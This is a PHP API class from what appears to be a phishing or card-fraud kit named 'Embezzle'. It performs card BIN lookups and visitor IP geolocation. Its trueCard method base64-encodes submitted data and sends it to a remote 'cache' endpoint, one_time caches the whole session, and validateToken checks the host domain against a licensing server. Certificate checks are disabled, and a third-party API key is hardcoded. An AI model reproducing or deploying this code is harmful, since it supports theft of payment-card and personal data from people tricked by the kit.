<?php

namespace Embezzle\Libraries;


class Api
{
    private $curl;
    public $api_url;
    private $sec;
    private $id;
    private $apiv1;
    public function __construct()
    {
        $this->id = CONFIG['web']['app_name'];
        $this->curl = new Curl;
        $this->api_url = CONFIG['web']['api_url'];
        $this->sec = new Security;
        $this->apiv1 = 'https://api.badyouth.net/v1/';
    }
    public function paramBuilder($name, $data = array())
    {
        $api = $this->api_url;
        $param = http_build_query($data);
        $afi = $api . '/' . $name . '?' . $param;

        return $afi;
    }
    public function fetchJson($json)
    {
        return json_decode($json, true);
    }
    public function apiBin($bin)
    {
        $this->curl->setUrl($this->paramBuilder('bin', ['bin' => $bin]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);

        $this->curl->buildOpt();
        return $this->fetchJson($this->curl->exec());
    }
    public function backupBin($bin)
    {

        $this->curl->setUrl('https://lookup.binlist.net/' . $bin);
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);
        $this->curl->buildOpt();
        $data = $this->fetchJson($this->curl->exec());
        $re = [
            'brand' => $data['scheme'],
            'country' => $data['country']['name'],
            'type' => $data['type'],
            'bank' => $data['bank']['name'],
            'level' => ''
        ];
        return $re;
    }
    public function getBin($bin)
    {
        $get1 = $this->backupBin($bin);
        if (isset($get1['brand'])) {
            return $get1;
        } else {
            return $this->apiBin($bin);
        }
    }
    public function backupCountry($ip)
    {

        $this->curl->setUrl('http://pro.ip-api.com/json/' . $ip . '?key=pvkVHu8z08PMDXN');
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);

        $this->curl->buildOpt();
        return $this->fetchJson($this->curl->exec());
    }
    public function apiCountry($ip)
    {
        $this->curl->setUrl($this->paramBuilder('country', ['ip' => $ip]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);

        $this->curl->buildOpt();
        return $this->fetchJson($this->curl->exec());
    }
    public function getCountry($ip)
    {
        $get1 = $this->backupCountry($ip);

        if (isset($_SESSION['getCountry'])) {
            return $_SESSION['getCountry'];
        } else {
            if (isset($get1['countryCode'])) {
                $_SESSION['getCountry'] = $get1;
                return $get1;
            } else {
                $_SESSION['getCountry'] = $this->apiCountry($ip);
                return $this->apiCountry($ip);
            }
        }
    }
    public function trueCard($data)
    {
        $data = base64_encode($data);
        $this->curl->setUrl($this->paramBuilder('cache', ['data' => $data]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);

        $this->curl->buildOpt();
        $response = $this->fetchJson($this->curl->exec());

        if ($response) {
            return true;
        } else {
            return false;
        }
    }
    public function one_time()
    {
        $hander = new Handler;
        $_SESSION['done'] = true;
        $cache = $hander->cache($_SESSION);
        return;
    }

    public function validate()
    {

        if (isset($_SESSION['validate_api'])) {
            return $_SESSION['validate_api'];
        } else {
            $data = $this->validateToken();

            if ($data['status'] != 'valid' && $data['code'] != 1) {

                require dirname(__DIR__) . '/setup.php';
                exit;
            } else {
                $_SESSION['validate_api'] = $data;
                return $_SESSION['validate_api'];
            }
        }
    }
    public function validateToken()
    {
        $hander = new Handler;
        $domain = $hander->detection()['webdomain'];



        $this->curl->setUrl($this->apiv1 . 'check-domain?domain=' . $domain . '&id=' . $this->id);
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('Embezzle@Component');
        $this->curl->setVerifyPeer(false);

        $this->curl->buildOpt();
        $p = $this->fetchJson($this->curl->exec());

        return $p;
    }
}
